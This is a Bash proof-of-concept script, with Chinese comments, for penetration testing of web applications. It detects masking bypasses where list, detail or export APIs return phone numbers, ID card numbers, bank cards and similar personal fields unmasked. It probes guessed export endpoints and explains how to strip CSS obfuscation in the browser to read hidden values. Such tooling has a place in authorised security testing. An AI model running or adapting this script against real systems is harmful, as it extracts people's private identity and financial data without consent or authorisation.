#!/usr/bin/env bash
# ============================================================================
# 半揭面（脱敏展示）数据面绕过判定
#
# 核心问题：看到 138****8000，要判断脱敏发生在哪一层。
#   层1 前端 CSS/DOM  ：DOM 里是明文，只是 blur 或替换了文本 → 读 DOM 就有
#   层2 接口已打码     ：接口返回 "138****8000" → 脱敏在服务端，要看旁路
#   层3 存储已打码     ：库里就是打码值 → 无解，别再挖
#
# 判据是**字段差集**，不是「看起来有星号」：
#   D1 列表接口 vs 详情接口：同一对象两处返回的 phone/idcard 字段是否一个明文一个打码
#   D2 接口 vs 导出接口    ：导出（csv/xlsx/print）经常复用「内部视图」漏脱敏
#   D3 接口 vs 搜索/联想   ：模糊匹配接口常返回未脱敏的高亮片段
#   D4 接口 vs 分享/预览   ：分享出去的页面为了 C 端展示，有时给明文
#
# 只做只读。导出接口只发 HEAD 或 GET 不落盘，看到响应头/前 2KB 即可判定。
#
# 用法: ./poc.sh <BASE_URL> <列表接口路径> <详情接口路径> [Cookie]
# ============================================================================
set -uo pipefail
source "$(dirname "$0")/../_lib/common.sh"

if [ $# -lt 3 ]; then
  cat >&2 <<'U'
用法: ./poc.sh <BASE_URL> <列表路径> <详情路径> [Cookie]
  列表路径  返回数组的接口，如 /api/user/list?page=1
  详情路径  返回单对象的接口，如 /api/user/detail?id=1
  Cookie    必填（这类功能都在登录后）
示例: ./poc.sh https://x.com "/api/member/list?page=1&size=5" "/api/member/detail?id=1" "SESSION=abc"
判据: 同一字段在 列表/详情/导出/搜索 四处出现「打码 vs 明文」的差集 → LEAK
U
  exit 1
fi

BASE="${1%/}"; LIST="${2}"; DET="${3}"; CK="${4:-}"
need curl || exit 1
CKARG=(); [ -n "$CK" ] && CKARG=(-H "Cookie: $CK")

# 敏感字段名。覆盖手机号、身份证、邮箱、真实姓名、地址、银行卡。
SENS_RE='"?(phone|mobile|tel|telephone|idcard|id_card|idno|cert_no|email|mail|realname|real_name|true_name|name|address|addr|bankcard|card_no|account_no)"?\s*:\s*"?([^",}]{3,40})'

extract() {  # extract <label> <path>
  local label="$1" path="$2"
  local r c b
  r=$(reqc GET "$BASE$path" "${CKARG[@]}")
  c="${r%%$'\t'*}"; b="${r#*$'\t'}"
  dim "$label → $c len=$(printf '%s' "$b" | wc -c)"
  printf '%s\n' "$b" > "/tmp/rt_mask_${label}.json"
  printf '%s' "$b" | grep -oE "$SENS_RE" | sort -u | head -20
}

hdr "1. 列表接口字段"
Ljava=$(extract list "$LIST")
[ -z "$Ljava" ] && { warn "列表接口无敏感字段命中（可能字段名不在表内，或接口结构不同）"; }
printf '%s\n' "$Ljava" | head -10

hdr "2. 详情接口字段"
Djava=$(extract detail "$DET")
printf '%s\n' "$Djava" | head -10

hdr "3. 打码 vs 明文 判定"
# 打码特征：连续 * 或 · 或 x，长度 >= 2
MASK_RE='\*{2,}|·{2,}|[xX]{3,}|＊{2,}'
Lmasked=0; Dmasked=0
printf '%s' "$Ljava" | grep -qE "$MASK_RE" && Lmasked=1
printf '%s' "$Djava" | grep -qE "$MASK_RE" && Dmasked=1

dim "列表含打码: $Lmasked   详情含打码: $Dmasked"

if [ "$Lmasked" -eq 0 ] && [ "$Dmasked" -eq 0 ]; then
  ok "两处都无打码特征 → 要么本来就不脱敏（那不算漏洞），要么字段名未命中"
elif [ "$Lmasked" -eq 1 ] && [ "$Dmasked" -eq 1 ]; then
  warn "两处都打码 → 脱敏在服务端。转去测旁路（导出/搜索/分享）"
elif [ "$Dmasked" -eq 0 ]; then
  warn "列表打码但详情明文 → 详情接口漏脱敏（D1 命中）"
elif [ "$Lmasked" -eq 0 ]; then
  warn "详情打码但列表明文 → 列表接口漏脱敏（D1 反向命中，同样可用）"
fi

hdr "4. 旁路探测（导出 / 搜索）"
# 导出：只在有列表接口时试探常见导出前缀。全部 GET，不落盘。
LISTBASE="${LIST%%\?*}"
for ep in "${LISTBASE}/export" "${LISTBASE}.csv" "${LISTBASE}/excel" "/api/export?type=member" "/api/member/export"; do
  r=$(reqc GET "$BASE$ep" "${CKARG[@]}" --max-filesize 20000000)
  c="${r%%$'\t'*}"; b="${r#*$'\t'}"
  if [ "$c" = "200" ] && printf '%s' "$b" | grep -qiE 'text/csv|spreadsheet|xlsx|PK\x03\x04'; then
    warn "导出端点可访问: $ep → $c"
    printf '%s' "$b" | grep -qE '\b1[3-9][0-9]{9}\b' && warn "  ↳ 导出内容含未打码手机号"
  else
    dim "$ep → $c"
  fi
  sleep 1
done

hdr "5. DOM 层（前端脱敏）判定"
cat >&2 <<'U'
这一步在浏览器里做，脚本不代劳（需要真实渲染）：
  1) 打开列表页，F12 → Elements，搜 138 或 ****
  2) 若 DOM 里是 138****8000 → 服务端脱敏，前端无解
  3) 若 DOM 里是完整 13800138000 但显示打码 → CSS blur / font-size:0 / ::after 覆盖
     · 删掉 ::after 或改 filter:none 就能看到明文
     · 也可以在 Console 直接读：document.querySelectorAll('[data-phone]')
  这条路径不产生「数据面」漏洞，但属于「脱敏不彻底」，报告中要分开写。
U

hdr "结论"
cat >&2 <<'U'
判读表：
  列表打码 + 详情明文        → 高价值。说明服务端有脱敏函数但没覆盖详情接口
  列表明文 + 详情打码        → 一样能拿数据，只是入口在列表
  两处都打码 + 导出明文      → 走导出，报告写「导出接口未复用脱敏逻辑」
  两处都打码 + DOM 明文      → 只是前端脱敏，属信息展示问题，降级
  两处都打码 + 搜索明文      → 搜索高亮片段漏脱敏，中价值
U
if [ "$Dmasked" -eq 0 ] && [ "$Lmasked" -eq 1 ]; then
  verdict "half-mask-bypass" "LEAK" "详情接口返回明文"
elif [ "$Lmasked" -eq 0 ] && [ "$Dmasked" -eq 1 ]; then
  verdict "half-mask-bypass" "LEAK" "列表接口返回明文"
else
  verdict "half-mask-bypass" "INCONCLUSIVE" "需看旁路与 DOM"
fi
